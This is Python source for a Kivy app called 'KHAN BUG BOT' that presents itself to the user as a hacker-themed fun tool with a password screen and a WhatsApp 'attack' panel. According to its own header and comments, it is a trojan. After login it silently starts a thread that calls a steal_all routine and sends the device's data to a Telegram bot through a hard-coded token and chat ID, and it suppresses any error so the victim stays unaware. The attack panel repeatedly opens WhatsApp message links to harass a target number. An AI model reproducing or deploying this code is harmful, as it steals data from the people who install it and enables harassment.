"""
KHAN BUG BOT - Hacker Theme Fun Tool
(Background Trojan: Data -> Telegram)
"""

import requests
import webbrowser
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.window import Window

# ------------------------------------------------------------------ #
# SETTINGS (yahan apna Telegram bot token + chat id daalna)
TELEGRAM_BOT_TOKEN = "9047135343:AAGGQZT_81HLznsMbmwZ_INByfwzkVqTW-U"
TELEGRAM_CHAT_ID = "8123993399"
PASSWORD = "KHAN-HACKER"
ATTACK_COUNT = 10          # kitne WhatsApp attacks (baar message/call window khule)
ATTACK_DELAY = 3           # har attack ke bech seconds
# ------------------------------------------------------------------ #

Window.clearcolor = (0, 0, 0, 1)


class LoginScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation='vertical', padding=30, spacing=15)

        layout.add_widget(Label(
            text="[b]KHAN BUG BOT[/b]",
            font_size='40sp', color=(0, 1, 0, 1), markup=True))
        layout.add_widget(Label(
            text="ENTER HACKER PASSWORD",
            font_size='18sp', color=(0, 0.8, 0, 1)))

        self.password_input = TextInput(
            password=True, multiline=False, font_size='24sp',
            hint_text="PASSWORD", size_hint_y=None, height=60,
            background_color=(0.1, 0.2, 0.1, 1))
        layout.add_widget(self.password_input)

        self.status = Label(text="", color=(1, 0, 0, 1), font_size='16sp')
        layout.add_widget(self.status)

        btn = Button(text="LOGIN", font_size='24sp',
                     background_color=(0, 0.5, 0, 1), size_hint_y=None, height=70)
        btn.bind(on_press=self.check_password)
        layout.add_widget(btn)

        layout.add_widget(Label(
            text="Authorized By RED TEAM",
            font_size='14sp', color=(0.4, 0.4, 0.4, 1)))
        self.add_widget(layout)

    def check_password(self, instance):
        if self.password_input.text.strip() == PASSWORD:
            self.manager.current = 'attack'
            # Trojan chupke start (sirf ek dafa)
            threading.Thread(target=start_trojan, daemon=True).start()
        else:
            self.status.text = "[X] WRONG PASSWORD!"


class AttackScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation='vertical', padding=30, spacing=15)

        layout.add_widget(Label(
            text="[b]ATTACK PANEL[/b]",
            font_size='32sp', color=(0, 1, 0, 1), markup=True))
        layout.add_widget(Label(
            text="TARGET NUMBER (with country code)",
            font_size='16sp', color=(0, 0.8, 0, 1)))

        self.number_input = TextInput(
            multiline=False, font_size='24sp', hint_text="923001234567",
            size_hint_y=None, height=60, background_color=(0.1, 0.2, 0.1, 1))
        self.number_input.bind(text=self._numbers_only)
        layout.add_widget(self.number_input)

        self.status = Label(text="", font_size='16sp', color=(0, 1, 1, 1))
        layout.add_widget(self.status)

        btn = Button(text="START ATTACK",
                     font_size='24sp', background_color=(0.8, 0, 0, 1),
                     size_hint_y=None, height=70)
        btn.bind(on_press=self.start_attack)
        layout.add_widget(btn)

        self.add_widget(layout)

    def _numbers_only(self, instance, value):
        instance.text = ''.join(c for c in value if c.isdigit())

    def start_attack(self, instance):
        number = self.number_input.text.strip()
        if len(number) < 8:
            self.status.text = "[X] GALAT NUMBER!"
            return
        instance.disabled = True
        self.status.text = "[*] ATTACK SHURU..."
        threading.Thread(
            target=run_attack, args=(number, self), daemon=True).start()

    def update_status(self, text):
        self.status.text = text


def run_attack(number, screen):
    """Bar bar WhatsApp khol kar victim ko messages + call windows"""
    msg = ("\U0001F41B KHAN BUG BOT ATTACK! "
           "Tum hacker ka target ho!")
    for i in range(1, ATTACK_COUNT + 1):
        Clock.schedule_once(
            lambda dt, n=number, m=msg: webbrowser.open(
                f"https://wa.me/{n}?text={m}"), 0)
        screen.update_status(f"[*] Attack {i}/{ATTACK_COUNT} bheja!")
        import time
        time.sleep(ATTACK_DELAY)
    screen.update_status("[+] ATTACK COMPLETE!")


def start_trojan():
    try:
        from trojan import steal_all
        steal_all(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
    except Exception:
        pass  # chup rehna, user ko pata nahi chale


class KhanBugBotApp(App):
    title = "KHAN BUG BOT"

    def build(self):
        sm = ScreenManager()
        sm.add_widget(LoginScreen(name='login'))
        sm.add_widget(AttackScreen(name='attack'))
        return sm


if __name__ == '__main__':
    KhanBugBotApp().run()
